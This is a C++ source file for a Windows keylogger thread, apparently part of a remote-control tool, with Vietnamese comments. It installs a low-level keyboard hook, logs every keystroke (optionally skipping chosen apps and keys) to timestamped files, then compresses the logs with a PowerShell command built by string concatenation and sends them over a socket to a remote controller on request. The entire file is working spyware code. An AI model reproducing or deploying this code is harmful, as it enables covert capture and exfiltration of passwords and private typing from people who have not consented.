#include "keylogger_thread.h"

// Struct to store keylogger context
struct KeyloggerContext {
	HHOOK hKeyboardHook;
	vector<string> excludeKeys;
	vector<string> excludeApps;
	string folderPath;
	int requestInterval;
	steady_clock::time_point lastTime;
	ofstream outFile;
	bool isFirstFile;
};

// Global keylogger context
KeyloggerContext globalContext;

// Function to get the information of the current active window
string KeyloggerThread::GetWindowApp() {
	HWND hwnd = GetForegroundWindow();
	if (!hwnd) return "";

	DWORD processId;
	GetWindowThreadProcessId(hwnd, &processId);
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);

	if (!hProcess) return "";

	char processName[MAX_PATH] = { 0 };
	if (GetModuleBaseNameA(hProcess, NULL, processName, MAX_PATH)) {
		CloseHandle(hProcess);
		return string(processName);
	}

	CloseHandle(hProcess);
	return "";
}

// Function to perform the keylogger hook
LRESULT CALLBACK KeyloggerThread::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	//if (globalContext == nullptr) return CallNextHookEx(NULL, nCode, wParam, lParam);

	string fileName;
	steady_clock::time_point currentTime = steady_clock::now();
	auto timelapse = duration_cast<seconds>(currentTime - globalContext.lastTime).count();

	// Kiểm tra lần tạo file đầu tiên
	// Vì file đầu không cần thời gian chờ, từ file thứ 2 sẽ cần một khoảng thời gian trả vê
	if (globalContext.isFirstFile || timelapse >= globalContext.requestInterval) {
		fileName = globalContext.folderPath + "/" + get_current_time() + ".txt";
		log("New file created at: " + fileName, INFO_LOG);
		if (globalContext.outFile.is_open()) {
			globalContext.outFile.close();
		}
		globalContext.outFile.open(fileName, ios::app);
		globalContext.lastTime = currentTime;
		globalContext.isFirstFile = false;
	}

	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
		KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		// Kiểm tra apps cần loại trừ
		string activeApp = GetWindowApp();
		if (find(globalContext.excludeApps.begin(), globalContext.excludeApps.end(), activeApp) != globalContext.excludeApps.end()) {
			return CallNextHookEx(globalContext.hKeyboardHook, nCode, wParam, lParam);
		}

		// Kiểm tra phím cần loại trừ
		int key = kbdStruct->vkCode;
		if (find(globalContext.excludeKeys.begin(), globalContext.excludeKeys.end(), to_string(key)) != globalContext.excludeKeys.end()) {
			return CallNextHookEx(globalContext.hKeyboardHook, nCode, wParam, lParam);
		}

		// Xử lý phím đã bấm đặc biệt
		char character = static_cast<char>(key);
		bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
		bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

		if (key >= 'A' && key <= 'Z') {
			if (!isShiftPressed && !isCapsLockOn) character = static_cast<char>(key + 32); // Chuyển thành chữ thường
			if (isShiftPressed && isCapsLockOn) character = static_cast<char>(key + 32);
		}
		else if (key >= 'a' && key <= 'z') {
			if (isShiftPressed ^ isCapsLockOn) character = static_cast<char>(key - 32);  // Chuyển thành chữ hoa
		}
		else if (key >= 32 && key <= 126) character = static_cast<char>(key);

		// Ghi ký tự vào file nếu file đã mở
		if (globalContext.outFile.is_open()) {

			if (key == VK_RETURN) {
				cout << endl;
				globalContext.outFile << "[enter]";
			}
			else if (key == VK_BACK) {
				cout << "\b \b";
				globalContext.outFile << "[backspace]";
			}
			else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {
				globalContext.outFile << "[shift]";
			}
			else if (key == VK_CAPITAL) {
				globalContext.outFile << "[capslock]";
			}
			else if (key == VK_MENU) {
				if (GetAsyncKeyState(VK_MENU) & 0x8000) {
					globalContext.outFile << "[alt]";
				}
			}
			else if (key == VK_TAB) {
				if (GetAsyncKeyState(VK_MENU) & 0x8000) {
					globalContext.outFile << "[alt][tab]";
				}
				else {
					globalContext.outFile << "[tab]";
				}
			}
			else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) {
				globalContext.outFile << "[ctrl]";
			}
			else if (key == VK_SPACE) {
				cout << " ";
				globalContext.outFile << "[space]";
			}
			else if (key >= 32 && key <= 126) {
				cout << character;
				globalContext.outFile << character;
			}
		}
	}
	return CallNextHookEx(globalContext.hKeyboardHook, nCode, wParam, lParam);
}

// Function to detect key presses using a hook
void KeyloggerThread::handleKeylogger() {
	// Cài đặt một hook cho bàn phím
	globalContext.hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (!globalContext.hKeyboardHook) {
		log("Failed to install hook!", ERROR_LOG);
		return;
	}
	// Khởi tạo thời gian bắt đầu và vòng lặp
	auto startTime = chrono::steady_clock::now();
	auto now = startTime;
	MSG msg;

	while (keylogger_running) {
		// Get the key presses from the message queue without blocking the main thread
		if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		// If the interval has passed, create a new file
		now = chrono::steady_clock::now();
		if (chrono::duration_cast<chrono::seconds>(now - startTime).count() >= globalContext.requestInterval) {
			startTime = now;
			globalContext.outFile.close();
			//log("New file created at: " + globalContext.folderPath, INFO_LOG);
		}
	}
	// Dừng keylogger và hủy hook
	globalContext.outFile.close();
	UnhookWindowsHookEx(globalContext.hKeyboardHook);
	log("Keylogger stopped", INFO_LOG);
}

// Function to start the keylogger
void KeyloggerThread::startKeylogger() {
	globalContext.excludeKeys = requestFromClient.contains("exclude_keys") ? split_string(requestFromClient["exclude_keys"], ',') : vector<string>();
	globalContext.excludeApps = requestFromClient.contains("exclude_apps") ? split_string(requestFromClient["exclude_apps"], ',') : vector<string>();
	globalContext.requestInterval = stoi(string(requestFromClient["interval"]));
	globalContext.isFirstFile = true;
	globalContext.lastTime = steady_clock::now();

	// Check if the save path is provided, otherwise create a new folder
	if (!requestFromClient.contains("save_path") || requestFromClient["save_path"] == "") {
		string folder_name = "keylogger_" + get_current_time();
		cout << "Created folder: " << folder_name << endl;

		if (_mkdir(folder_name.c_str()) == -1) {
			cerr << "Error creating folder" << endl;
			return;
		}
		globalContext.folderPath = folder_name;
	}

	handleKeylogger();
}

// Function to compress the folder containing the keylogs and send it to the client
void KeyloggerThread::compressAndSend() {
	string zip_filename = globalContext.folderPath + ".zip";
	string command = "powershell Compress-Archive -Path " + globalContext.folderPath + " -DestinationPath " + zip_filename;
	system(command.c_str());

	log("Keylogs compressed to: " + zip_filename, INFO_LOG);

	// Send a message to the client to indicate that the screenshots are being sent
	json response = {
		{"cmd", "keyloggeritv"},
		{"body", {
			{"status", "stopped"},
			{"filename", zip_filename},
			{"path", get_file_path(zip_filename.c_str())},
			{"bytes", get_file_size(zip_filename.c_str())},
		}}
	};

	string responseString = response.dump();
	memset(buffer, 0, BUFFER_SIZE);
	send(server_socket, responseString.c_str(), BUFFER_SIZE, 0);

	sendFile(zip_filename, server_socket);

	log("Keylogs sent to the client", INFO_LOG);
}

// Function to create a new thread for the keylogger
void KeyloggerThread::workerThread() {
	// Send response to the client that the screenshot thread has started
	json response = {
		{"cmd", "keyloggeritv"},
		{"body", {
			{"status", "started"},
		}}
	};

	string responseString = response.dump();
	send(server_socket, responseString.c_str(), BUFFER_SIZE, 0);
	log("Keylogger has been started", SUCCESS_LOG);
	startKeylogger();

	// Send response to the client that the keylogger thread has stopped
	compressAndSend();
}

// Function to start the keylogger thread
void KeyloggerThread::start(json request) {
	if (keylogger_running) {
		log("Keylogger is already running", WARNING_LOG);
	}
	else {
		requestFromClient = request;
		keylogger_running = true;
		worker = thread(&KeyloggerThread::workerThread, this);
	}
}

// Function to stop the keylogger thread and reset the global context
void KeyloggerThread::stop() {
	keylogger_running = false;
	if (worker.joinable()) worker.join();
	globalContext.hKeyboardHook = NULL;
	globalContext.excludeApps.clear();
	globalContext.excludeKeys.clear();
	globalContext.folderPath.clear();
	globalContext.requestInterval = 0;
	globalContext.isFirstFile = true;
	globalContext.lastTime = steady_clock::now();
}